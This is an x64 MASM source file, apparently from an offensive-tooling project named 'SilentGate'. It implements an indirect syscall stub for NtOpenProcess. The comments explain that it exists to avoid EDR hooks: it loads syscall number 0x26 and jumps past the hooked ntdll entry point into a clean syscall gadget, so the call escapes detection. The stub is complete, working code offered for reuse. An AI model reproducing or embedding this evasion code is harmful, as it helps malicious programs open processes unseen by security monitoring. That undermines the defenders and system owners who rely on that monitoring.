; ===========================================================
; SilentGate - Indirect Syscall Stub (x64 MASM)
; ===========================================================
; API    : NtOpenProcess
; SSN    : 38 (0x26)
; Author : JarDani
; License: MIT
;
; HOW THIS WORKS:
;   Normal call path (EDR catches this):
;     Your code -> NtOpenProcess in ntdll -> [EDR HOOK] -> kernel
;
;   Indirect syscall path (EDR misses this):
;     Your code -> SG_NtOpenProcess -> loads SSN -> jumps into
;     clean ntdll stub -> syscall executes from ntdll space -> kernel
;
;   The EDR hook sits at the START of NtOpenProcess in ntdll.
;   We never touch that hooked address.
;   We jump PAST the hook into a clean syscall gadget in ntdll.
; ===========================================================

.code

EXTERN SG_NtOpenProcess_addr:QWORD  ; address of clean ntdll gadget

SG_NtOpenProcess PROC
    mov r10, rcx          ; mirror rcx into r10 (Windows x64 ABI)
    mov eax, 26h    ; load SSN 38 into eax
    jmp QWORD PTR [SG_NtOpenProcess_addr]  ; indirect jump to clean ntdll stub
SG_NtOpenProcess ENDP

END
